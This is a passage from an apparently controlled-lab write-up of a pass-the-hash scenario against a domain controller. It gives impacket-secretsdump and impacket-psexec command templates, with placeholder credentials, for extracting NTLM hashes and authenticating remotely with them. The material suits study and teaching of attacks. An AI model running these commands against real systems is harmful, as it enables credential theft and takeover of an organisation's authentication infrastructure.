The target is `DC01`, the domain controller. This makes the scenario especially sensitive because the activity affects the core authentication system of the lab.

---

## 4. Execution Summary

The controlled scenario followed this logic:

```text
credential material extraction → NTLM hash reuse → privileged remote authentication → remote activity on DC01
```

Example credential extraction structure:

```bash
impacket-secretsdump 'LAB/<privileged_user>:<PASSWORD>@192.168.56.30'
```

Example Pass-the-Hash structure:

```bash
impacket-psexec -hashes :<NTLM_HASH> LAB/<privileged_user>@192.168.56.20
```

All credentials and hashes are placeholders.

The public repository must not include:

- real passwords;
- real NTLM hashes;
- raw credential material;
- unredacted secretsdump output;
- private raw logs containing sensitive data.

